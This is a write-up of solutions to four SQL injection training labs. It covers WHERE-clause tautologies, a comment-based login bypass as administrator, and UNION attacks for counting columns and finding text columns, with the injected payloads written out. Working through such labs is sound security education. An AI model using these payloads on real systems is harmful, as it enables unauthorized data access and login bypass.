# SQL Injection

## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Sol:
`+OR+1=1`

![image](https://user-images.githubusercontent.com/33444140/234489856-c3dd5689-888c-4571-b135-030024b0af06.png)

## Lab 2: SQL injection vulnerability allowing login bypass

### Sol:

`administrator'--`

![image](https://user-images.githubusercontent.com/33444140/234491811-0cffcfb0-ba68-4bfa-8d8a-14bc8ab32d66.png)

![image](https://user-images.githubusercontent.com/33444140/234492060-e5cd29d0-f65c-4d79-b894-efa1394cda95.png)

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Sol :

`category='Pets'+union+select+null,null,.....<No of null occurences> --`

### Using one and two null values will gives us Internal Server Error due to non-matching of null values with no of cols

    category=Pets+union+select+null--
    
![image](https://user-images.githubusercontent.com/33444140/235349085-16ab2024-dbfa-4a0d-bf25-6767545b482a.png)

### Using third null will match the no of cols

    category=Pets+union+select+null,null,null--
    
![image](https://user-images.githubusercontent.com/33444140/235349154-0bcd2a7f-9f72-467f-be22-baae68c20f85.png)

### Alternate Sol :

> An alternate solution to count the no of cols by using `ORDER BY`. Injecting `ORDER BY 1--` will order the results by the first column of the result. Incrementing the value leads to an internal server error when using `ORDER BY 4--` as the database is instructed to order by a column that does not exist. Thus the correct number of columns is 3.    
 
## Lab 4: SQL injection UNION attack, finding a column containing text.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Make the database retrieve the string: 'e0J9uf'

### Sol :

  First we have to determine the no of cols of the category by using NULL values as shown above.
  
    category=Pets+union+select+null,null,null--
    
Then we have to check which col contains string by replacing null with 'a' each col

    category=Pets+union+select+'a',null,null--
    category=Pets+union+select+null,'a',null--
    category=Pets+union+select+null,null,'a'--
    
In this lab category we got 2nd col as string. So we replace `'a'` with the desired string.

    category=Pets+union+select+null,'e0J9uf',null--
    
Lab is solved.

![image](https://user-images.githubusercontent.com/33444140/235350029-db8d0569-07c6-4caf-baa9-913039a30d35.png)
